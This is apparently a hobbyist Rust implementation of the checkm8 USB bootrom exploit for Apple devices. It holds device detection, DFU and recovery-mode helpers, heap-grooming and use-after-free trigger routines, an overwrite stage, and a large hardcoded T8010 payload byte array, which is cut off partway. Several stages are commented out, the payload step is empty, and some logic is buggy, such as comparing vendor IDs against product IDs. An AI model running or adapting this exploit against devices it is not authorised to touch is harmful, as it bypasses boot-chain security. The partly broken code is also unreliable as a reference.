use rusb::ffi::{libusb_control_transfer, libusb_error_name, libusb_strerror};
use rusb::{self, DeviceDescriptor, UsbContext};
use rusty_libimobiledevice::idevice;
use rusty_libimobiledevice::services::lockdownd;
use std::ffi::{c_long, c_uchar, c_uint, c_ushort, c_void, CStr};
use std::thread::sleep;
use std::time::{Duration, Instant};
use std::{ptr};
use tokio;

// MARK: constants
pub const DFU_DNLOAD: u8 = 1;
pub const DFU_UPLOAD: u8 = 2;
pub const DFU_GETSTATUS: u8 = 3;
pub const DFU_CLRSTATUS: u8 = 4;
pub const DFU_GETSTATE: u8 = 5;
pub const DFU_ABORT: u8 = 6;
pub const DFU_FILE_SUFFIX_LENGTH: usize = 16;
pub const EP0_MAX_PACKET_SIZE: u16 = 0x40;
pub const DFU_MAX_TRANSFER_SIZE: u16 = 0x800;
pub const DFU_STATUS_OK: u8 = 0;
pub const DFU_STATE_MANIFEST_SYNC: u8 = 6;
pub const DFU_STATE_MANIFEST: u8 = 7;
pub const DFU_STATE_MANIFEST_WAIT_RESET: u8 = 8;

// USB constants
pub const USB_TIMEOUT: u32 = 10;

// 0x5ac, 0x1227 -> dfu
// 0x5ac, 0x1281 -> recovery
// 0x5ac, 0x4141 -> pongo

// MARK: device detection
async fn find_apple_device() -> Option<rusb::DeviceHandle<rusb::Context>> {
    let context = rusb::Context::new().unwrap();
    let device_list = context.devices().unwrap();
    for device in device_list.iter() {
        let device_handle = device.open().unwrap();
        let device_descriptor = device_handle.device().device_descriptor().unwrap();
        if device_descriptor.vendor_id() == 0x5ac
            && device_descriptor.vendor_id() != 0x1227
            && device_descriptor.vendor_id() != 0x1281
            && device_descriptor.vendor_id() != 0x4141
        {
            sleep(Duration::from_millis(800));
            return Some(device_handle);
        }
    }
    return None;
}

async fn find_device(mode: &str, device_descriptor: &DeviceDescriptor) -> bool {
    if device_descriptor.vendor_id() != 0x5ac {
        // just bail if not apple
        return false;
    }
    // println!("product ID: 0x{:04x}", device_descriptor.product_id());
    match mode {
        "dfu" => {
            if device_descriptor.product_id() == 0x1227 {
                println!("Device in DFU found!");
                return true;
            }
        }
        "recovery" => {
            if device_descriptor.product_id() == 0x1281 {
                println!("Device in recovery found!");
                return true;
            }
        }
        "pongo" => {
            if device_descriptor.product_id() == 0x4141 {
                println!("Device in pongoOS found!");
                return true;
            }
        }
        _ => {
            println!("Invalid mode");
            return false;
        }
    };
    return false;
}

async fn find_device_in_dfu() -> Option<rusb::Device<rusb::Context>> {
    let context = rusb::Context::new().unwrap();
    let device_list = context.devices().unwrap();
    for device in device_list.iter() {
        let device_desc = device.device_descriptor().unwrap();
        if find_device("dfu", &device_desc).await == true {
            return Some(device.clone());
        }
    }
    return None;
}

async fn find_device_in_recovery() -> Option<rusb::Device<rusb::Context>> {
    let context = rusb::Context::new().unwrap();
    let device_list = context.devices().unwrap();
    for device in device_list.iter() {
        let device_desc = device.device_descriptor().unwrap();
        if find_device("recovery", &device_desc).await == true {
            return Some(device.clone());
        }
    }
    return None;
}

fn timer(mut seconds: u64, what_to_say: &str) {
    while seconds > 0 {
        println!("\r{} {}", seconds, what_to_say);
        sleep(Duration::from_secs(1));
        seconds -= 1;
    }
}

/*
if home button:
hold power and home button for 4 seconds
hold home button for 10 seconds

if no home button:
hold voldown + side for 4 seconds
release side buttom, keep holding voldown for 10 seconds

cpid of no home:
#define NOHOME (cpid == 0x8015 || (cpid == 0x8010 && (bdid == 0x08 || bdid == 0x0a || bdid == 0x0c || bdid == 0x0e)))

Example serial number:
CPID:8010 <- Get by searching for CPID: and then getting the next 4 characters
 CPRV:11 CPFM:03 SCEP:01 BDID:08 <- Get by searching for BDID: and then getting the next 2 characters
 ECID:000269E20846003A IBFL:3C SRTG:[iBoot-2696.0.0.1.33]
 */

fn get_cpid_from_serial(serial: &str) -> &str {
    let cpid_index = serial.find("CPID:").unwrap();
    // println!("CPID index: {}", cpid_index);
    let cpid = &serial[cpid_index + 5..cpid_index + 9]; // chatgpt did this for me please idk
                                                        // println!("CPID: {}", cpid);
    return &cpid;
}

fn get_bdid_from_serial(serial: &str) -> &str {
    let bdid_index = serial.find("BDID:").unwrap();
    // println!("BDID index: {}", bdid_index);
    let bdid = &serial[bdid_index + 5..bdid_index + 7]; // chatgpt did this for me please idk
                                                        // println!("BDID: {}", bdid);
    return &bdid;
}

fn send_command_to_recovery(usb_handle: &rusb::DeviceHandle<rusb::Context>, command: &str) {
    // if command.len() <= 0x100 && command.len() > 1 {
        unsafe {
            let ret = libusb_control_transfer(
                usb_handle.as_raw(),
                0x40,
                0,
                0,
                0,
                command.as_ptr() as *mut u8,
                (command.len() + 1).try_into().unwrap(),
                USB_TIMEOUT,
            ); // how do I know if this even worked?
            if ret < 0 {
                let error_name = CStr::from_ptr(libusb_error_name(ret));
                let error_message = CStr::from_ptr(libusb_error_name(ret));
                println!(
                    "Error sending command to recovery: {:?} ({:?})",
                    error_name, error_message
                );
            } else {
                // println!("Command sent to recovery successfully: {}", command);
            }
        }
    // } else {
        // println!("Invalid command length");
    // }
}

// MARK: dfu helper
fn dfu_helper(usb_handle: &rusb::DeviceHandle<rusb::Context>) {
    let device_descriptor = usb_handle.device().device_descriptor().unwrap();
    let serial_number = usb_handle
        .read_serial_number_string_ascii(&device_descriptor)
        .unwrap();
    // println!("Serial number: {}", serial_number);
    let cpid = get_cpid_from_serial(&serial_number).parse::<u16>().unwrap();
    let bdid = get_bdid_from_serial(&serial_number).parse::<u16>().unwrap();
    let is_home_button = (cpid == 0x8015
        || (cpid == 0x8010 && (bdid == 0x08 || bdid == 0x0a || bdid == 0x0c || bdid == 0x0e)));

    println!("Press any character when you are ready to enter DFU");
    std::io::stdin().read_line(&mut String::new()).unwrap();

    timer(3, "Get ready...");
    if (is_home_button) {
        timer(4, "Hold home + power button");
    } else {
        timer(4, "Hold volume down + side button");
    }

    send_command_to_recovery(usb_handle, "setenv auto-boot true");
    sleep(Duration::from_millis(100));
    send_command_to_recovery(usb_handle, "saveenv");
    sleep(Duration::from_millis(100));
    send_command_to_recovery(usb_handle, "reboot");

    if (is_home_button) {
        timer(10, "Hold down home button only");
    } else {
        timer(10, "Hold down volume button only")
    }
}

async fn kick_into_recovery() -> bool {
    match find_device_in_dfu().await {
        None => {
            println!("No device in DFU, kicking into recovery");
        }
        _ => {
            println!("Device in DFU, exiting");
            return false;
        }
    }
    let device_list = idevice::get_devices().unwrap();
    
    // while device_list.len() <= 0 {
        let ret = lockdownd::LockdowndClient::new(&device_list[0], "dfu");
        if let Ok(client) = ret {
            let _ = lockdownd::LockdowndClient::enter_recovery(&client);
            // lockdownd::LockdowndClient::goodbye(client);
        }
    // }
    if find_device_in_recovery().await.is_some() {
        return true;
    }
    println!("Failed to kick into recovery");
    return false;
}

// MARK: usb stuff

fn send_usb_control_request_no_data(
    handle: &rusb::DeviceHandle<rusb::Context>,
    bm_request_type: u8,
    b_request: u8,
    w_value: u16,
    w_index: u16,
    w_length: usize,
) -> bool {
    // let mut transfer_ret: rusb::ControlTransferReturnStatus = rusb::ControlTransferReturnStatus::Ok;

    if w_length == 0 {
        send_usb_control_request(
            handle,
            bm_request_type,
            b_request,
            w_value,
            w_index,
            ptr::null_mut(),
            0,
        )
    } else {
        let mut data: *mut c_void =
            unsafe { std::alloc::alloc(std::alloc::Layout::from_size_align(w_length, 1).unwrap()) }
                as *mut c_void;
        if !data.is_null() {
            unsafe {
                std::ptr::write_bytes(data as *mut c_uchar, 0, w_length);
            }
            let result = send_usb_control_request(
                handle,
                bm_request_type,
                b_request,
                w_value,
                w_index,
                data,
                w_length as c_ushort,
            );
            unsafe {
                std::alloc::dealloc(
                    data as *mut u8,
                    std::alloc::Layout::from_size_align(w_length, 1).unwrap(),
                )
            };
            result
        } else {
            false
        }
    }
}

fn send_usb_control_request(
    handle: &rusb::DeviceHandle<rusb::Context>,
    bm_request_type: u8,
    b_request: u8,
    w_value: u16,
    w_index: u16,
    data: *mut c_void,
    w_length: c_ushort,
) -> bool {
    unsafe {
        let ret = libusb_control_transfer(
            handle.as_raw(),
            bm_request_type,
            b_request,
            w_value,
            w_index,
            data as *mut c_uchar,
            w_length,
            USB_TIMEOUT,
        );
        if ret < 0 {
            let error_name = CStr::from_ptr(libusb_error_name(ret));
            let error_message = CStr::from_ptr(libusb_error_name(ret));
            println!(
                "{:?} ({:?})",
                error_name, error_message
            );
        }
        return ret > 0;
    };
}

async fn send_usb_control_request_async(
    handle: &rusb::DeviceHandle<rusb::Context>,
    bm_request_type: u8,
    b_request: u8,
    w_value: u16,
    w_index: u16,
    data: *mut c_void,
    w_length: c_ushort,
    usb_abort_timeout: u16,
) -> bool {
    let start = Instant::now();

    let result = async {
        unsafe {
            libusb_control_transfer(
                handle.as_raw(),
                bm_request_type,
                b_request,
                w_value,
                w_index,
                data as *mut std::os::raw::c_uchar,
                w_length,
                usb_abort_timeout.into(),
            )
        }
    }
    .await;

    let elapsed = start.elapsed();
    if elapsed >= Duration::from_millis(usb_abort_timeout.into()) {
        eprintln!("USB control transfer timed out");
        return false;
    }

    result >= 0
}

async fn send_usb_control_request_async_no_data(
    handle: &rusb::DeviceHandle<rusb::Context>,
    bm_request_type: u8,
    b_request: u8,
    w_value: u16,
    w_index: u16,
    w_length: usize,
    usb_abort_timeout: u16,
) -> bool {
    let start = Instant::now();

    if w_length == 0 {
        async {
            unsafe {
                let ret = libusb_control_transfer(
                    handle.as_raw(),
                    bm_request_type,
                    b_request,
                    w_value,
                    w_index,
                    std::ptr::null_mut(),
                    0,
                    usb_abort_timeout.into(),
                );
                if ret < 0 {
                    let error_name = CStr::from_ptr(libusb_error_name(ret));
                    let error_message = CStr::from_ptr(libusb_error_name(ret));
                    println!(
                        "{:?} ({:?})",
                        error_name, error_message
                    );
                }
            }
        }
        .await;

        let elapsed = start.elapsed();
        if elapsed >= Duration::from_millis(usb_abort_timeout.into()) {
            eprintln!("USB control transfer timed out");
            return false;
        } else {
            return true;
        }
    } else {
        let mut data = vec![0u8; w_length];
        let result = async {
            unsafe {
                libusb_control_transfer(
                    handle.as_raw(),
                    bm_request_type,
                    b_request,
                    w_value,
                    w_index,
                    data.as_mut_ptr() as *mut std::os::raw::c_uchar,
                    w_length as c_ushort,
                    usb_abort_timeout.into(),
                )
            }
        }
        .await;

        let elapsed = start.elapsed();
        if elapsed >= Duration::from_millis(usb_abort_timeout.into()) {
            eprintln!("USB control transfer timed out");
            return false;
        }

        result >= 0
    }
}

// MARK:  sort of dfu stuff?

fn dfu_check_status(usb_handle: &rusb::DeviceHandle<rusb::Context>, status: u8, state: u8) {
    unsafe {
        let mut ret = libusb_control_transfer(
            usb_handle.as_raw(),
            0x21,
            DFU_DNLOAD,
            0,
            0,
            std::ptr::null_mut(),
            DFU_FILE_SUFFIX_LENGTH.try_into().unwrap(),
            USB_TIMEOUT,
        );
    }
}

fn reset_device(usb_handle: &rusb::DeviceHandle<rusb::Context>) {
    println!("Resetting device for checkm8");
    unsafe {
        send_usb_control_request_no_data(
            usb_handle,
            0x21,
            DFU_DNLOAD,
            0,
            0,
            DFU_FILE_SUFFIX_LENGTH.try_into().unwrap(),
        );
        // send_usb_control_request_no_data(handle, 0x21, DFU_DNLOAD, 0, 0, DFU_FILE_SUFFIX_LENGTH, &transferRet);

        // Send zero length packet to end existing transfer

        // Request image validation like we are about to boot it
        send_usb_control_request_no_data(usb_handle, 0x21, DFU_DNLOAD, 0, 0, 0);
        // return send_usb_control_request_no_data(handle, 0x21, DFU_DNLOAD, 0, 0, 0, &transfer_ret)

        // Start a new DFU transfer
        send_usb_control_request_no_data(
            usb_handle,
            0x21,
            DFU_DNLOAD,
            0,
            0,
            // std::ptr::null_mut(),
            EP0_MAX_PACKET_SIZE.into(),
            // USB_TIMEOUT,
        );
        // ret = send_usb_control_request_no_data(handle, 0x21, DFU_DNLOAD, 0, 0, EP0_MAX_PACKET_SIZE, &transferRet);

        // Ready
        // return true;
    }
}

// MARK: stall endpoint, heap fengshui
//https://habr.com/en/companies/dsec/articles/472762/
fn stall_usb_request(usb_handle: &rusb::DeviceHandle<rusb::Context>) {
    send_usb_control_request_no_data(usb_handle, 0x2, DFU_GETSTATUS, 0, 0x80, 0);
}

fn checkm8_send_leaking_zlp(usb_handle: &rusb::DeviceHandle<rusb::Context>) {
    send_usb_control_request_no_data(usb_handle, 0x80, DFU_ABORT, 0x304, 0x40A, 0x40);
}

fn checkm8_send_normal_zlp(usb_handle: &rusb::DeviceHandle<rusb::Context>) {
    send_usb_control_request_no_data(usb_handle, 0x80, DFU_ABORT, 0x304, 0x40A, 0xC1);
}

async fn checkm8_stall(usb_handle: &rusb::DeviceHandle<rusb::Context>) {
    let mut usb_abort_timeout = 10;
    let mut counter = 0;
    while (send_usb_control_request_async_no_data(
        usb_handle,
        0x80,
        DFU_ABORT,
        0x304,
        0xA,
        0xC0,
        usb_abort_timeout,
    ))
    .await
    {
        // shorten timer to hopefully abort the transfer halfway thru
        send_usb_control_request_async_no_data(usb_handle,
            0x80,
            DFU_ABORT,
            0x304,
            0xA,
            0x40,
            1
        ).await;
        usb_abort_timeout = (usb_abort_timeout + 1) % 10;
        if counter < 500 {
            counter += 1;
        } else {
            break;
        }
    }
}

async fn heap_fengshui(usb_handle: &rusb::DeviceHandle<rusb::Context>) {
    println!("Stage 1: heap fengshui");
    checkm8_stall(usb_handle).await;
    // Leak one zlp and stall the endpoint.
    println!("Sending zero length packets");
    // Send enough packets to fill the hole
    let mut config_hole = 5;
    while (config_hole > 0) {
        // println!("ZLP");
        checkm8_send_normal_zlp(usb_handle);
        config_hole -=1;
    }
    // Add another leaking packet the end of the hole
    checkm8_send_leaking_zlp(usb_handle);
}

fn send_abort(usb_handle: &rusb::DeviceHandle<rusb::Context>) {
    let unsafe_handle = usb_handle.as_raw();
    unsafe {
        libusb_control_transfer(unsafe_handle, 0x21, 0x4, 0, 0, std::ptr::null_mut(), 0, 0);
    }
    // send_usb_control_request_no_data(handle, 0x21, 0x4, 0, 0, 0, NULL);
}

async fn trigger_uaf(usb_handle: &rusb::DeviceHandle<rusb::Context>) {
    //     1. Start a **control request transfer** with **data phase**
    // 	        1. Interrupt the transfer halfway
    //     2. Issue a **DFU abort** (0x21, 4), which frees the USB buffer
    // 	        1. DFU abort will cause us to reenter, which **restarts the USB stack and reallocates our buffer**
    //     3. Finish the interrupted transfer.
    // 	        1. **Send data phase packets** once DFU is re-entered.
    //     4. The data will be `memcpy`d on top of the freed pointer.
    println!("Stage 2: trigger uaf");
    let mut usb_timeout = 10;
    let mut counter = 500;
    if counter > 0 {
    while (send_usb_control_request_async_no_data(
        usb_handle,
        0x21,
        DFU_DNLOAD,
        0,
        0,
        2048,
        usb_timeout)
    ).await {
        // overwrite padding
        println!("overwrite padding");
        usb_timeout = (usb_timeout + 1) % 10;
        counter -=1;
        send_usb_control_request_no_data(usb_handle, 0, 0, 0, 0,  0x5c0 - 10); // overwritePadding
    }
}
    send_abort(&usb_handle);
}

fn overwrite(usb_handle: &rusb::DeviceHandle<rusb::Context>) {
    println!("Stage 3: overwrite");
    // TODO: payload and whatever, skid the switch case from Achilles

    stall_usb_request(usb_handle);
    checkm8_send_leaking_zlp(usb_handle);

    send_usb_control_request_no_data(usb_handle, 2, DFU_GETSTATUS, 0, 0x80, 0);
    send_usb_control_request_no_data(usb_handle, 2, DFU_GETSTATUS, 0, 0x80, 0);

    // Send overwrite, checking that endpoint is still stalled
    if send_usb_control_request(usb_handle, 0, 0, 0, 0, YOLO_T8010_BIN.as_ptr() as *mut c_void, YOLO_T8010_BIN_LEN.try_into().unwrap()) {
        // This is the trigger for execution
        send_usb_control_request_no_data(usb_handle, 0x21, DFU_CLRSTATUS, 0, 0, 0);
        println!("Checkmate");
    }
}

fn send_payload(usb_handle: &rusb::DeviceHandle<rusb::Context>) {
    println!("stage 3.5: send payload");
}

async fn checkm8(usb_handle: &rusb::DeviceHandle<rusb::Context>) {
    // reset_device(&usb_handle);
    // heap_fengshui(&usb_handle).await;
    // trigger_uaf(&usb_handle).await;
    overwrite(&usb_handle);
    send_payload(&usb_handle);
}

#[tokio::main]
async fn main() {
    let find_device_in_dfu_task = find_device_in_dfu();
    let find_device_in_recovery_task = find_device_in_recovery();
    let find_apple_device_task = find_apple_device();

    tokio::select! {
        Some(device) = find_device_in_dfu_task => {
            let device_handle = device.open().unwrap();
            checkm8(&device_handle).await;
        }
        Some(device) = find_device_in_recovery_task => {
            let device_handle = device.open().unwrap();
            dfu_helper(&device_handle);
            checkm8(&device_handle).await;
        }
        Some(device) = find_apple_device_task => {
            kick_into_recovery().await;
            dfu_helper(&device);
            checkm8(&device).await;
        }
        else => {
            // Handle the case where none of the tasks succeed
            println!("Device detection failed.");
        }
    }
}
  


// MARK: t8010 payload
static YOLO_T8010_BIN: &[u8] = &[
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xa5, 0x06, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x44, 0xcc, 0x00, 0x00,
        0x01, 0x00, 0x00, 0x00, 0x20, 0x00, 0x0b, 0x80, 0x01, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x44, 0xcc, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,
        0x40, 0x00, 0x0b, 0x80, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x25, 0x06, 0x00, 0x80, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x44, 0xcc, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0xc0, 0x00, 0x0b, 0x80,
        0x01, 0x00, 0x00, 0x00, 0x00, 0x44, 0x0b, 0x80, 0x01, 0x00, 0x00, 0x00,
        0x08, 0x18, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x04, 0x44, 0x0b, 0x80, 0x01, 0x00, 0x00, 0x00, 0x08, 0x18, 0x00, 0x00,
        0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x08, 0x45, 0x0b, 0x80,
        0x01, 0x00, 0x00, 0x00, 0x08, 0x18, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x60, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x44, 0xcc, 0x00, 0x00,
        0x01, 0x00, 0x00, 0x00, 0xe0, 0x00, 0x0b, 0x80, 0x01, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x03, 0x40, 0x0a, 0x80, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x44, 0xcc, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,
        0x00, 0x01, 0x0b, 0x80, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x01, 0x00, 0x00, 0x80, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x44, 0xcc, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x80, 0x01, 0x0b, 0x80,
        0x01, 0x00, 0x00, 0x00, 0x0c, 0x45, 0x0b, 0x80, 0x01, 0x00, 0x00, 0x00,
        0x08, 0x18, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x46, 0x0b, 0x80, 0x01, 0x00, 0x00, 0x00, 0x08, 0x18, 0x00, 0x00,
        0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x04, 0x46, 0x0b, 0x80,
        0x01, 0x00, 0x00, 0x00, 0x08, 0x18, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x06, 0x0b, 0x40,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x44, 0xcc, 0x00, 0x00,
        0x01, 0x00, 0x00, 0x00, 0xa0, 0x01, 0x0b, 0x80, 0x01, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x44, 0xcc, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,
        0xc0, 0x01, 0x0b, 0x80, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x44, 0xcc, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x40, 0x02, 0x0b, 0x80,
        0x01, 0x00, 0x00, 0x00, 0x68, 0x9f, 0x0a, 0x80, 0x01, 0x00, 0x00, 0x00,
        0x08, 0x18, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x44, 0x0b, 0x80, 0x01, 0x00, 0x00, 0x00, 0x6c, 0x04, 0x00, 0x00,
        0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x45, 0x0b, 0x80,
        0x01, 0x00, 0x00, 0x00, 0x6c, 0x04, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x44, 0xcc, 0x00, 0x00,
        0x01, 0x00, 0x00, 0x00, 0x60, 0x02, 0x0b, 0x80, 0x01, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x44, 0xcc, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,
        0x80, 0x02, 0x0b, 0x80, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x44, 0xcc, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x03, 0x0b, 0x80,
        0x01, 0x00, 0x00, 0x00, 0x00, 0x46, 0x0b, 0x80, 0x01, 0x00, 0x00, 0x00,
        0x6c, 0x04, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x06, 0x0b, 0x80, 0x01, 0x00, 0x00, 0x00, 0x6c, 0x04, 0x00, 0x00,
        0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x48, 0x04, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x44, 0xcc, 0x00, 0x00,
        0x01, 0x00, 0x00, 0x00, 0x20, 0x03, 0x0b, 0x80, 0x01, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x44, 0xcc, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,
        0x40, 0x03, 0x0b, 0x80, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x44, 0xcc, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0xc0, 0x03, 0x0b, 0x80,
        0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0xb8, 0xa4, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x40, 0x0b, 0x80, 0x01, 0x00, 0x00, 0x00, 0xe4, 0x03, 0x00, 0x00,
        0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x34, 0x04, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xa5, 0x06, 0x00, 0x80,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x44, 0xcc, 0x00, 0x00,
        0x01, 0x00, 0x00, 0x00, 0xe0, 0x03, 0x0b, 0x80, 0x01, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x44, 0xcc, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,
        0x00, 0x04, 0x0b, 0x80, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x25, 0x06, 0x00, 0x80, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x44, 0xcc, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x80, 0x04, 0x0b, 0x80,
        0x01, 0x00, 0x00, 0x00, 0x00, 0x05, 0x0a, 0x42, 0x01, 0x00, 0x00, 0x00,
        0x08, 0x18, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x04, 0x05, 0x0a, 0x42, 0x01, 0x00, 0x00, 0x00, 0x08, 0x18, 0x00, 0x00,
        0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x08, 0x05, 0x0a, 0x42,
        0x01, 0x00, 0x00, 0x00, 0x08, 0x18, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x60, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x44, 0xcc, 0x00, 0x00,
        0x01, 0x00, 0x00, 0x00, 0xa0, 0x04, 0x0b, 0x80, 0x01, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x44, 0xcc, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,
        0xc0, 0x04, 0x0b, 0x80, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x44, 0xcc, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x40, 0x05, 0x0b, 0x80,
